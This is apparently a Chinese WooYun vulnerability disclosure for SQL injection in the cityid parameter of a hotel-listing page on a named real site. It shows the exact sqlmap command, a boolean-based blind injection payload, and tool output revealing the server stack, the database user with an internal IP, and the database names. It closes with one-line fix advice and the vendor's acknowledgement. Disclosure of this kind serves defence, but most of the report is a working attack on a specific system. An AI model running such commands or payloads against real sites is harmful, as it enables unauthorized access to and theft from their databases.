wybug_detail:
漏洞详情 披露状态：   									2015-12-18：	细节已通知厂商并且等待厂商处理中									2015-12-18：	厂商已经确认，细节仅向厂商公开									2015-12-28：	细节向核心白帽子及相关领域专家公开									2016-01-07：	细节向普通白帽子公开									2016-01-17：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 每个月总有那几天需要打卡！ 详细说明：  
python sqlmap.py -u "http://anhuinews.zhuna.net/hotellist.php?cityid=1301*&txtCity=%E5%90%88%E8%82%A5&tm1=2015-12-18&tm2=2015-12-19&seachQ=" --dbs  --technique T

eb server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)web application technology: Apache 2.2.20, PHP 5.3.6back-end DBMS: MySQL 5[22:52:59] [INFO] fetching current user[22:52:59] [INFO] resumed: zhongan@192.168.0.230current user:    'zhongan@192.168.0.230'
   漏洞证明：  
Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://anhuinews.zhuna.net:80/hotellist.php?cityid=1301' AND 9281=9281 AND 'gDdS'='gDdS&txtCity=%E5%90%88%E8%82%A5&tm1=2015-12-18&tm2=2015-12-19&seachQ=---[22:48:22] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[22:48:22] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)web application technology: Apache 2.2.20, PHP 5.3.6back-end DBMS: MySQL 5[22:48:22] [INFO] fetching database names[22:48:22] [INFO] fetching number of databases[22:48:22] [INFO] resumed: 5[22:48:22] [INFO] resumed: information_schema[22:48:22] [INFO] resumed: mysql[22:48:22] [INFO] resumed: mysql_9tour_cn[22:48:22] [INFO] resumed: mysql_mapdata_com[22:48:22] [INFO] resumed: testavailable databases [5]:[*] information_schema[*] mysql[*] mysql_9tour_cn[*] mysql_mapdata_com[*] test
   修复方案：  sql过滤   版权声明：转载请注明来源 专业种田@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-18 10:04 厂商回复： 非常感谢您反馈的信息，相关问题已交由技术处理。 最新状态： 暂无
